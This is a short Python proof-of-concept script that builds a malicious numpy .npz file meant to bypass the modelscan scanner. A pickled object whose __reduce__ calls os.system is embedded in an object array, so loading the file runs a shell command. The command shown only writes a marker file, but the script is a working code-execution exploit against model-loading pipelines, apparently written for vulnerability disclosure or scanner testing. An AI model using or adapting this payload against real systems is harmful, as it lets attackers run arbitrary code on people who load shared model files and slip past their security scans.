# PoC Generator for modelscan .npz Bypass
import numpy as np
import os
import pickle
import zipfile
import io

class Pwn:
    def __reduce__(self):
        return (os.system, ('echo PWNED_P4 > pwned_p4.txt',))

def make_malicious_npz():
    """Create a .npz that triggers os.system on load."""
    arr = np.array([Pwn()], dtype=object)
    np.savez('malicious.npz', arr_0=arr)
    print('Wrote malicious.npz')

if __name__ == '__main__':
    make_malicious_npz()
